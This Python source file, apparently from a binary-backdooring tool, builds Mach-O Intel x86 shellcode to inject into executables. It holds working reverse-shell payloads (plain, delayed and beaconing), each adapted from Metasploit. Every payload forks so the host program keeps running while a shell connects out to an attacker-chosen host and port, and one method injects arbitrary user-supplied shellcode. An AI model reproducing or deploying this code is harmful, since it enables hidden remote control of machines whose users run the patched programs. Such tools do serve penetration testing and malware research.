'''

Copyright (c) 2013-2014, Joshua Pitts
All rights reserved.

Redistribution and use in source and binary forms, with or without modification,
are permitted provided that the following conditions are met:

    1. Redistributions of source code must retain the above copyright notice,
    this list of conditions and the following disclaimer.

    2. Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

    3. Neither the name of the copyright holder nor the names of its contributors
    may be used to endorse or promote products derived from this software without
    specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
POSSIBILITY OF SUCH DAMAGE.

'''

import struct


class macho_intel32_shellcode():
    """
    Mach-O Intel x32 shellcode class
    """

    def __init__(self, HOST='127.0.0.1', PORT=8080, jumpLocation=0x0, SUPPLIED_SHELLCODE=None, BEACON=15):
        self.HOST = HOST
        self.PORT = PORT
        self.jumpLocation = jumpLocation
        self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE
        self.BEACON = BEACON
        self.shellcode = ""

    def pack_ip_addresses(self):
        hostocts = []
        for i, octet in enumerate(self.HOST.split('.')):
                hostocts.append(int(octet))
        self.hostip = struct.pack('=BBBB', hostocts[0], hostocts[1],
                                  hostocts[2], hostocts[3])
        return self.hostip

    def returnshellcode(self):
        return self.shellcode

    def delay_reverse_shell_tcp(self):
        #Modified from metasploit
        if self.PORT is None:
            print ("Must provide port")
            return False
        if self.HOST is None:
            print ("This payload requires a HOST parameter -H")
            return False

        self.shellcode2 = "\xB8\x74\x00\x00\x02\xcd\x80"   # put system time in eax
        self.shellcode2 += "\x05"                           # add eax, 15  for seconds
        self.shellcode2 += struct.pack("<I", self.BEACON)
        self.shellcode2 += ("\x89\xC3"                      # mov ebx, eax
                            "\xB8\x74\x00\x00\x02\xcd\x80"  # put system time in eax
                            "\x39\xD8"                      # cmp eax, ebx
                            "\x0F\x85\xf1\xff\xff\xff"      # jne back to system time
                            )
        self.shellcode2 += "\x68"
        self.shellcode2 += self.pack_ip_addresses()
        self.shellcode2 += "\x68\xff\x02"
        self.shellcode2 += struct.pack(">H", self.PORT)
        self.shellcode2 += ("\x89\xe7\x31\xc0\x50"
                            "\x6a\x01\x6a\x02\x6a\x10\xb0\x61\xcd\x80\x57\x50\x50\x6a\x62"
                            "\x58\xcd\x80\x50\x6a\x5a\x58\xcd\x80\xff\x4f\xe8\x79\xf6\x68"
                            "\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x54\x53"
                            "\x50\xb0\x3b\xcd\x80"
                            )

        self.shellcode1 = ("\xB8\x02\x00\x00\x02\xcd\x80\x85\xd2")
        self.shellcode1 += "\x0f\x84"
        if self.jumpLocation < 0:
            self.shellcode1 += struct.pack("<I", len(self.shellcode1) + 0xffffffff + self.jumpLocation)
        else:
            self.shellcode1 += struct.pack("<I", len(self.shellcode2) + self.jumpLocation)

        self.shellcode = self.shellcode1 + self.shellcode2
        return (self.shellcode1 + self.shellcode2)

    def beaconing_reverse_shell_tcp(self):
        #Modified from metasploit
        if self.PORT is None:
            print ("Must provide port")
            return False
        if self.HOST is None:
            print ("This payload requires a HOST parameter -H")
            return False

        self.shellcode2 = "\xB8\x02\x00\x00\x02\xcd\x80\x85\xd2"  # FORK
        #fork
        self.shellcode2 += "\x0f\x84"                             # TO TIME CHECK
        self.shellcode2 += "\x41\x00\x00\x00"

        self.shellcode2 += "\x68"
        self.shellcode2 += self.pack_ip_addresses()
        self.shellcode2 += "\x68\xff\x02"
        self.shellcode2 += struct.pack(">H", self.PORT)
        self.shellcode2 += ("\x89\xe7\x31\xc0\x50"
                            "\x6a\x01\x6a\x02\x6a\x10\xb0\x61\xcd\x80\x57\x50\x50\x6a\x62"
                            "\x58\xcd\x80\x50\x6a\x5a\x58\xcd\x80\xff\x4f\xe8\x79\xf6\x68"
                            "\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x54\x53"
                            "\x50\xb0\x3b\xcd\x80"
                            )

        #Time Check
        self.shellcode2 += "\xB8\x74\x00\x00\x02\xcd\x80"   # put system time in eax
        self.shellcode2 += "\x05"                           # add eax, 15  for seconds
        self.shellcode2 += struct.pack("<I", self.BEACON)
        self.shellcode2 += ("\x89\xC3"                      # mov ebx, eax
                            "\xB8\x74\x00\x00\x02\xcd\x80"  # put system time in eax
                            "\x39\xD8"                      # cmp eax, ebx
                            "\x0F\x85\xf1\xff\xff\xff"      # jne back to system time
                            "\xe9\x8E\xff\xff\xff\xff"      # jmp back to FORK
                            )

        #FORK to main program
        self.shellcode1 = ("\xB8\x02\x00\x00\x02\xcd\x80\x85\xd2")
        self.shellcode1 += "\x0f\x84"
        if self.jumpLocation < 0:
            self.shellcode1 += struct.pack("<I", len(self.shellcode1) + 0xffffffff + self.jumpLocation)
        else:
            self.shellcode1 += struct.pack("<I", len(self.shellcode2) + self.jumpLocation)

        self.shellcode = self.shellcode1 + self.shellcode2
        return (self.shellcode1 + self.shellcode2)

    def reverse_shell_tcp(self):
        #Modified from metasploit
        if self.PORT is None:
            print ("Must provide port")
            return False
        if self.HOST is None:
            print ("This payload requires a HOST parameter -H")
            return False

        self.shellcode2 = "\x68"
        self.shellcode2 += self.pack_ip_addresses()
        self.shellcode2 += "\x68\xff\x02"
        self.shellcode2 += struct.pack(">H", self.PORT)
        self.shellcode2 += ("\x89\xe7\x31\xc0\x50"
                            "\x6a\x01\x6a\x02\x6a\x10\xb0\x61\xcd\x80\x57\x50\x50\x6a\x62"
                            "\x58\xcd\x80\x50\x6a\x5a\x58\xcd\x80\xff\x4f\xe8\x79\xf6\x68"
                            "\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x54\x53"
                            "\x50\xb0\x3b\xcd\x80"
                            )

        self.shellcode1 = ("\xB8\x02\x00\x00\x02\xcd\x80\x85\xd2")
        self.shellcode1 += "\x0f\x84"
        if self.jumpLocation < 0:
            self.shellcode1 += struct.pack("<I", len(self.shellcode1) + 0xffffffff + self.jumpLocation)
        else:
            self.shellcode1 += struct.pack("<I", len(self.shellcode2) + self.jumpLocation)

        self.shellcode = self.shellcode1 + self.shellcode2
        return (self.shellcode1 + self.shellcode2)

    def user_supplied_shellcode(self):
        if self.SUPPLIED_SHELLCODE is None:
            print "[!] User must provide shellcode for this module (-U)"
            return False
        else:
            supplied_shellcode = open(self.SUPPLIED_SHELLCODE, 'r+b').read()
        self.shellcode2 = supplied_shellcode

        self.shellcode1 = ("\xB8\x02\x00\x00\x02\xcd\x80\x85\xd2")
        self.shellcode1 += "\x0f\x84"
        if self.jumpLocation < 0:
            self.shellcode1 += struct.pack("<I", len(self.shellcode1) + 0xffffffff + self.jumpLocation)
        else:
            self.shellcode1 += struct.pack("<I", len(self.shellcode2) + self.jumpLocation)

        self.shellcode = self.shellcode1 + self.shellcode2
        return (self.shellcode1 + self.shellcode2)
